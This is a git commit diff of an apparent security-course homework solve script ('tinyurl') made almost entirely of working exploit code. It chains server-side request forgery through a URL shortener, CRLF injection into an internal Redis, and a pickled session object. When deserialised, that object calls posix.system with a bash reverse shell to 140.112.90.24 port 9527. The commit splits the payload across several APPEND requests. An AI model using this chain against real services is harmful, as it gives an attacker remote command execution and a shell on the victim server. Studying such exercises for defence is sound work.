848fbd743d86c123d5b134f5c00d2893eacfdf47
Alfons0329 <alfons.cs04@g2.nctu.edu.tw>
2019-11-30 02:22:19 +0800

    Commit some tinyurl requirements

--- Hw0x06/tinyurl/solve.py
+++ Hw0x06/tinyurl/solve.py
@@ -3,6 +3,7 @@ import urllib, requests, socket
 import os
 import pickle, redis
 
+#-------------OK---------------#
 url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00"%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
 
 print(url_post)
@@ -10,20 +11,37 @@ r = requests.post('https://localhost:10163', data={'url': url_post}, verify=Fals
 print(r.status_code, r.text)
 requests.get(r.text, verify=False)
 
-url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "bash -c \'bash -i >& "%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
+#-------------OK---------------#
+url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "bash -c"%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
 
 print(url_post)
 r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
 print(r.status_code, r.text)
 requests.get(r.text, verify=False)
+#-------------OK---------------#
+url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" " 'bash -i"%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
 
-url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0APPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "/dev/tcp/140.112.90.24/9527 0>&1\'"%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
 print(url_post)
 r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
 print(r.status_code, r.text)
 requests.get(r.text, verify=False)
+#-------------OK---------------#
+url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" " >"%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
 
-url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "q\x01\x85q\x02Rq\x03."%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
+print(url_post)
+r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
+print(r.status_code, r.text)
+requests.get(r.text, verify=False)
+#-------------OK---------------#
+url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "%26/dev/tcp/140.112.90.24/9527" %0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
+
+print(url_post)
+r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
+print(r.status_code, r.text)
+requests.get(r.text, verify=False)
+#-------------OK---------------#
+url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "0>%261\'q\x01\x85q\x02Rq\x03." %0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
+
 print(url_post)
 r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
 print(r.status_code, r.text)
